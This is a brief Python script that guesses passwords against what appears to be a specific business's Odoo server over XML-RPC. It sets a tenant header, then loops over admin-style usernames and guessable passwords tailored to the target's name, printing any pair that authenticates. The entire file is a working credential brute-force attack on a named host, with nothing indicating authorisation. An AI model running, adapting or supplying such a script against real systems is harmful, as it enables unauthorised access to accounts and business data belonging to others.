import xmlrpc.client
import os

url = "https://resto.contamela.com"
tenant_id = "resto"

class HeaderTransport(xmlrpc.client.Transport):
    def send_headers(self, connection, headers):
        headers.append(('X-Tenant-Id', tenant_id))
        super().send_headers(connection, headers)

common = xmlrpc.client.ServerProxy(f"{url}/xmlrpc/2/common", transport=HeaderTransport())

users = ["admin", "luis", "operator", "odoo"]
pwds = ["admin", "resto", "odoo", "contamela", "luis2026"]

for u in users:
    for p in pwds:
        try:
            uid = common.authenticate(tenant_id, u, p, {})
            if uid:
                print(f"FOUND: user={u} pass={p} uid={uid}")
                exit(0)
        except:
            continue
print("No credentials found.")
